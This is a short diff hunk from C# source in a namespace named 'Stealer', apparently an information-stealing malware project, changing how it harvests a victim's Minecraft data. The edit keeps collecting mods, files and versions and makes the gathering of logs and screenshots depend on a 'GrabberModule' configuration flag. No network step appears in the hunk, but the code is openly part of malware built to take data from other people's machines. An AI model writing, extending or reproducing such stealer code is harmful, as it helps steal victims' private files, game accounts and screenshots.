@@ -109,10 +109,13 @@ namespace Stealer // This shit coded by LimerBoy
             {
                 Directory.CreateDirectory(sSavePath);
                 SaveMods(sSavePath);
-                SaveLogs(sSavePath);
                 SaveFiles(sSavePath);
                 SaveVersions(sSavePath);
-                SaveScreenshots(sSavePath);
+                if (Config.GrabberModule == "1")
+                {
+                    SaveLogs(sSavePath);
+                    SaveScreenshots(sSavePath);
+                }
             }
             catch (Exception ex) { Logging.Log("Minecraft >> Failed collect data\n" + ex); }
         }
